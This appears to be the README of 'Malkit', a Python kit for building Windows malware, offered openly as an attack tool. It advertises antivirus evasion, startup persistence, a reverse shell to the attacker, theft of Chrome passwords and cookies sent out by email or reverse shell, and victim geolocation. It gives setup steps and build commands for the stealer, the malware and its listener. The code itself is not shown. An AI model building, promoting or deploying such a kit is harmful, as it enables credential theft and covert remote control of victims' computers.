# Malkit - Full malware kit

About The project

Malkit is a python-based console application that generates runtime-decrypted undetectable windows executables. It has the following features:

Copying itself into startup as a legitimate application
Connecting back to an attacker via reverse shell
Custom listener with upload, download and modular capability (in progress)
Chromepass feature:
Decrypt Chrome saved paswords ad well as all cookies
Send a file with the login/password combinations remotely (email or reverse shell)
Send a file with all the extracted cookies as well as another file with possible email-related cookies
Custom icon
Custom error message
Accurate location reporting. It can detect and send back a victim's accurate geolocation (not ip-based) (X)
Easy to use
Completely undetectable by AV engines


Installation


Chromepass requires Python 3.6+ to run. It has been tested on a full anaconda installation but it doesn't necessariliy require it. It doesn't work with Python 3.8 yet The instructions on the full setup are below.

Setup Anaconda environment:

Visit Anaconda and download the graphical installer for windows.
Run the installer and make sure you select the checkbox "Add conda to path", even though it isn't recommended.
Open up a new powershell window as administrator and run:
Set-ExecutionPolicy RemoteSigned
Press A when it prompts you.
Close this window
Open up a normal powershell and enable conda to use it:
conda init powershell
Close and open a new powershell and update conda:
conda update conda
Create a new anaconda environment:
conda create -n malkit python=3.7
Activate your environment:
conda activate malkit
Note: Every time you open a new powershell and want to run malkit you need to activate your environment.

Clone the Repository and access its directory:

> cd malkit

Install the dependencies:

> pip install -r requirements.txt

If any errors occur make sure you're running on the proper environment (if applcable) and that you have python 3.6+ < 3.8 (preferably 3.7.5). If the errors persist, try:

> python -m pip install --upgrade pip
> python -m pip install -r requirements.txt

Usage

Show the help screen
python malkit.py -h
usage: python malkit.py [-h] {build_listener, build_malware, build_chromepass} ...

positional arguments:
  {build_listener, build_malware, build_chromepass}

optional arguments:
  -h, --help            show this help message and exit
  
  Access the help menu for individual arguments
python malkit.py build_chromepass -h
usage: python malkit.py build_chromepass [-h] [--load] [--email] [--reverse_shell]
                                  [--no_error]
                                  [--errormsg Error message to appear]
                                  [--address Email address to send details to, if Email was chosen]
                                  [--port Port for reverse connection, if Reverse shell was chosen.]
                                  [--host Host reverse connection, if Reverse shell was chosen.]

optional arguments:
  -h, --help            show this help message and exit
  --load
  --email
  --reverse_shell
  --no_error
  --errormsg Error message to appear
  --address Email address to send details to, if Email was chosen
  --port Port for reverse connection, if Reverse shell was chosen.
  --host Host reverse connection, if Reverse shell was chosen.

example:

 python malkit.py build_chromepass --email --address myemail@gmail.com
 python malkit.py build_chromepass --reverse_shell --host 127.0.0.1 -p 4444
 python malkit.py build_chromepass --load myfile.conf
 
 Building an executable that grabs and sends chrome-saved passwords through email

python malkit.py build_chromepass --email --address youremailaddress@yourdomain.com
Creating a persistent reverse_shell with additional features

python malkit.py build_malware --host 127.0.0.1 -p 444
Replace the host with your external/internal ip as needed
Replace the port as needed
Make sure you build the listener as well and run it.
Creating a listener for the malware

python malkit.py build_listener -p 444
This is the listener for the malware
While in the shell, you can use the list command to see active sessions.
You can interact with a session by using the command: interact::SESSION_NUMBER where SESSION_NUMBER is the number of the session you want to connect with.
To go back into listener mode after interacting with a session, use the command <bg or <background
Other commands while interacting have been added but still experimental:
<download - Downloads a file from the server

License

Copyright (c) 2020 RBk-

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
